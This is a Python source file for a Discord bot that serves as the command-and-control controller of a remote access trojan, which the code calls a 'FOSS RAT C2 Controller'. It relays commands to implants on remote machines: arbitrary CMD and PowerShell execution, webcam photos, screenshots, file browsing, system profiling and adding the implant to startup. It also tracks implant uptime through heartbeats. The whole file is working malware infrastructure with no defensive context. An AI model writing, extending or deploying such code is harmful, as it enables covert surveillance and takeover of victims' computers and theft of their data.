import discord
from discord.ext import commands, tasks
import os
import datetime
import asyncio

# --- Configuration & State ---
TOKEN_PATH = 'token.txt'; AUTHORIZED_USERS = [1153459521251983470]
COMMAND_PREFIX = '?'; INSTRUCTION_PREFIX = 'EXEC_CMD:'; PONG_PREFIX = 'PONG:'
LIVE_SESSIONS_CATEGORY = "🔴 Live Sessions"; DOWN_SESSIONS_CATEGORY = "⚫️ Down Sessions"
HEARTBEAT_INTERVAL_SECONDS = 60; HEARTBEAT_TIMEOUT_SECONDS = 150
active_sessions = {}; last_heartbeat = {}

# --- Bot Setup ---
intents = discord.Intents.default(); intents.message_content = True
bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents, help_command=None)

# --- Helpers ---
def load_token():
    if not os.path.exists(TOKEN_PATH): raise FileNotFoundError(f"Token file not found: {TOKEN_PATH}")
    with open(TOKEN_PATH, 'r') as f: return f.read().strip()

# --- Bot Events & Heartbeat Task ---
@bot.event
async def on_ready():
    print(f'C2 Controller logged in as {bot.user}')
    heartbeat_check.start()

@bot.event
async def on_message(message):
    if message.author == bot.user and message.content.startswith(PONG_PREFIX):
        print(f"Received pong from channel ID: {message.channel.id}")
        last_heartbeat[message.channel.id] = datetime.datetime.now(datetime.timezone.utc)
        await message.delete()
        return
    if message.author.id not in AUTHORIZED_USERS: return
    await bot.process_commands(message)

@tasks.loop(seconds=HEARTBEAT_INTERVAL_SECONDS)
async def heartbeat_check():
    guild = bot.guilds[0]
    live_category = discord.utils.get(guild.categories, name=LIVE_SESSIONS_CATEGORY)
    if not live_category: return
    for channel in live_category.text_channels:
        await channel.send(f"{INSTRUCTION_PREFIX}ping")
    now = datetime.datetime.now(datetime.timezone.utc)
    stale_sessions = [cid for cid, seen in last_heartbeat.items() if (now - seen).total_seconds() > HEARTBEAT_TIMEOUT_SECONDS]
    if stale_sessions:
        down_category = discord.utils.get(guild.categories, name=DOWN_SESSIONS_CATEGORY) or await guild.create_category(DOWN_SESSIONS_CATEGORY, position=0)
        for channel_id in stale_sessions:
            channel = bot.get_channel(channel_id)
            if channel and channel.category == live_category:
                print(f"Session for {channel.name} timed out. Moving to Down Sessions.")
                await channel.edit(category=down_category)
                embed = discord.Embed(title="⚪ Session Timed Out", description=f"No heartbeat received from **{channel.name}**. The implant is presumed offline.", color=0x95a5a6)
                await channel.send(embed=embed)
            del last_heartbeat[channel_id]

@heartbeat_check.before_loop
async def before_heartbeat_check(): await bot.wait_until_ready()

# --- Dispatcher & Commands (No changes here) ---
async def dispatch_command(ctx, command: str, friendly_name: str, *args):
    if ctx.author.id not in active_sessions:
        await ctx.send(f"⚠️ No device selected. Use `{COMMAND_PREFIX}select <device_name>` first.")
        return False
    channel = active_sessions[ctx.author.id]
    if channel.category.name == DOWN_SESSIONS_CATEGORY:
        await ctx.send(f"⚠️ **{channel.name}** is offline. Cannot dispatch commands.")
        return False
    await channel.send(f"{INSTRUCTION_PREFIX}{command} {' '.join(args)}")
    await ctx.send(f"✅ Executed command: **{friendly_name}** on **{channel.name}**.")
    return True

# ... (All commands like help, list, select, etc. are unchanged) ...
@bot.command(name="help")
async def help_command(ctx):
    embed=discord.Embed(title="FOSS RAT C2 Controller Help",color=discord.Color.purple())
    for c in sorted(bot.commands,key=lambda x:x.name):
        if c.name!='help':embed.add_field(name=f"`{COMMAND_PREFIX}{c.name} {c.signature}`",value=c.help,inline=False)
    await ctx.send(embed=embed)
@bot.command(name="list")
async def list_devices(ctx):
    c=discord.utils.get(ctx.guild.categories,name=LIVE_SESSIONS_CATEGORY)
    if not c:return await ctx.send(f"❌ Category '{LIVE_SESSIONS_CATEGORY}' not found.")
    d=[f"📁 `{ch.name}`"for ch in c.text_channels]
    if not d:return await ctx.send("No active devices found.")
    await ctx.send(embed=discord.Embed(title="Active Devices",description="\n".join(d),color=discord.Color.green()))
@bot.command(name="select")
async def select(ctx,d:str):
    c=discord.utils.get(ctx.guild.text_channels,name=d.lower())
    if not c:return await ctx.send(f"❌ Device '{d}' not found.")
    active_sessions[ctx.author.id]=c;await ctx.send(f"✅ Session started. You are now controlling **{d}**.")
@bot.command(name="kill")
async def kill(ctx):await dispatch_command(ctx,"kill","Terminated implant session")
@bot.command(name="runcmd")
async def runcmd(ctx,*,c:str):await dispatch_command(ctx,"runcmd",f"Ran CMD command `{c}`",c)
@bot.command(name="runpw")
async def runpw(ctx,*,c:str):await dispatch_command(ctx,"runpw",f"Ran PowerShell command `{c}`",c)
@bot.command(name="explore")
async def explore(ctx,*,p:str=""):await dispatch_command(ctx,"explore",f"Explored path `{p or 'current directory'}`",p)
@bot.command(name="irlpicture")
async def irlpicture(ctx):await dispatch_command(ctx,"irlpicture","Took webcam picture")
@bot.command(name="openwebsite")
async def openwebsite(ctx,u:str):await dispatch_command(ctx,"openwebsite",f"Opened URL `{u}`",u)
@bot.command(name="putinstartup")
async def putinstartup(ctx):await dispatch_command(ctx,"putinstartup","Added implant to startup")
@bot.command(name="shownotification")
async def shownotification(ctx,t:str,*,m:str):await dispatch_command(ctx,"shownotification",f"Showed notification '{t}'",f'"{t}"',m)
@bot.command(name="systemspecs")
async def systemspecs(ctx):await dispatch_command(ctx,"systemspecs","Retrieved system specs")
@bot.command(name="takescreenshot")
async def takescreenshot(ctx):await dispatch_command(ctx,"takescreenshot","Took screenshot")
@bot.command(name="ping")
async def manual_ping(ctx):await dispatch_command(ctx,"ping","Sent manual ping")

# --- MODIFIED: Main Execution Block ---
async def main():
    """Main function to run the bot and handle graceful shutdown."""
    async with bot:
        try:
            await bot.start(load_token())
        except discord.errors.LoginFailure:
            print("❌ C2 BOT: Failed to log in. Please check your token.")
        except Exception as e:
            print(f"An unexpected error occurred in C2 Bot: {e}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nC2 Bot shutting down.")